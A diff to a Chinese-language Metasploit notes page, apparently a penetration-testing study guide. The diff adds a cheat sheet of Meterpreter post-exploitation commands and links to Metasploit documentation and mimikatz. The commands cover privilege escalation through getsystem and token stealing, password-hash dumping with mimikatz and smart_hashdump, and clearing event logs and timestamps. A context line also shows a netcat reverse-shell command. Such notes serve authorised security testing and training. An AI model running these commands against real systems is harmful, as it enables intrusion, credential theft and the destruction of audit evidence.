@@ -78,6 +78,25 @@ nc [LHOST] [LPORT] -e /bin/sh
 ## [Meterpreter](https://github.com/rapid7/metasploit-payloads)
 
 Meterpreter 是一种特殊的多功能载荷, 充分利用其功能可以使后渗透攻击变得十分方便.  
+以下列举几个常用功能:  
+
+```sh
+# 权限提升
+meterpreter > getsystem [...]   # 自动提权
+meterpreter > steal_token [pid] # 通过窃取拥有更高权限的进程的令牌提权
+
+# 获取密码
+meterpreter > load mimikatz                          # 载入 mimikatz
+meterpreter > run post/windows/gather/smart_hashdump # 导出账户密码 hash
+
+# 清除痕迹
+meterpreter > clearev         # 清除应用/系统/安全日志
+meterpreter > timestomp [...] # 编辑文件属性(包括创建/最后修改时间)
+
+# 使用 module
+meterpreter > search type:post  # 列出 post module
+meterpreter > run [module]      # 执行 module, 主要位于 "post/[system]" 下
+```
 
 ## 故障排除
 
@@ -91,4 +110,6 @@ Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
 
 ## 拓展
 
+- [Metasploit Documentation](https://docs.metasploit.com/)
 - <https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/>
+- [mimikatz](https://github.com/ParrotSec/mimikatz)
